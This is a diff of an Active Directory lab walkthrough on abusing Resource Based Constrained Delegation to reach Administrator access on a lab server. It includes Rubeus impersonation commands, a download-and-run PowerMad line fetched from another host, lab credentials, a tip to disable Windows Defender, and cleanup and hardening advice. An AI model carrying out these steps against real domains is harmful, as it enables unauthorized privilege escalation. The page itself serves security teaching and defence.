@@ -16,7 +16,7 @@ Nothing need to be configured to abuse this since we set the GenericAll permissi
 
 ### How it works
 
-Is you have GenericAll or GenericWrite rights to a computer object you can write to the attribute `msds-AllowedToActOnBehalfOfOtherIdentity`. If you control this attribute you can impersonate and authenticate as any domain user to the computer. Resulting in getting access as local administrator.
+Is you have GenericAll or GenericWrite rights to a computer object you can write to the attribute `msds-AllowedToActOnBehalfOfOtherIdentity`. If you control this attribute you can impersonate and authenticate as any domain user to the computer. Resulting in getting access to the computer as long as you can impersonate a user that has access too it. Users with the flag "This account is senstitive and cannot be delegated" or members of the "Protected Users Group" can't be impersonated.
 
 ### Tools
 
@@ -56,7 +56,7 @@ The attribute haven't been set yet.
 10.0.0.100 dc03.secure.local
 ```
 
-4\. Get the machine account qouta from the domain with Crackmapexec:
+4\. Check if we can add computers to the domain since its a requirement for the attack. We can get the machine account qouta from the domain with Crackmapexec:
 
 ```
 crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
@@ -66,7 +66,7 @@ crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
 
 The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.
 
-5\. Create machine account `FAKE01` with password `123456` with PowerMad:
+5\. Create a machine account with the name `FAKE01` and password `123456` with PowerMad:
 
 ```
 iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
@@ -118,44 +118,65 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 <S
 10\. `FAKE01` can impersonate any user now to `DATA01`. To do this we first need to calculate the NTLM hash for the `FAKE01` password, we can do this with Rubeus.
 
 ```
-// Some code
+.\Rubeus.exe hash /password:123456 /user:fake01 /domain:secure.local
 ```
 
+![](<../../../../.gitbook/assets/image (72).png>)
 
+{% hint style="info" %}
+Temporarily disable Windows Defender if it gets flagged by it.
+{% endhint %}
 
+11\. The next step is to run Rubeus to impersonate the `Administrator` user using the `FAKE01` Computeraccount. Abusing Resource Based Constrained Delegation. We will request a CIFS ticket so we can list the C disk.
 
+```
+.\Rubeus.exe s4u /domain:secure.local /dc:10.0.0.100 /user:fake01 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:CIFS/data01.secure.local /ptt
+```
 
+![](<../../../../.gitbook/assets/image (33).png>)
 
+![](<../../../../.gitbook/assets/image (59).png>)
 
+12\. We got a CIFS ticket as `Administrator` for `data01.secure.local`, now we can try to list the C disk.
 
+![](<../../../../.gitbook/assets/image (61).png>)
 
+### Cleanup
 
+1. Login to `DC03` as `Administrator` with the password `Welcome01!`.
+2. Execute the following command to remove the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute from `DATA01`.
 
+```
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount $null -Identity data01
+```
 
+3\. Execute the following command to remove the `FAKE01` computer we created:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```
+Get-ADComputer fake01 | Remove-ADObject
+```
 
 ## Defending
 
 ### Recommendations
 
+* Change who can add computers to the domain.
 
+{% content-ref url="../../../../defence/hardening/change-who-can-join-computers-to-the-domain.md" %}
+[change-who-can-join-computers-to-the-domain.md](../../../../defence/hardening/change-who-can-join-computers-to-the-domain.md)
+{% endcontent-ref %}
+
+* Add privileged users to the protected users group.
+
+{% content-ref url="../../../../defence/hardening/protected-users-group.md" %}
+[protected-users-group.md](../../../../defence/hardening/protected-users-group.md)
+{% endcontent-ref %}
+
+* Add the flag "Account is sensitive and cannot be delegated".
+
+{% content-ref url="../../../../defence/hardening/account-is-sensitive-and-cannot-be-delegated.md" %}
+[account-is-sensitive-and-cannot-be-delegated.md](../../../../defence/hardening/account-is-sensitive-and-cannot-be-delegated.md)
+{% endcontent-ref %}
 
 ### Detection
 
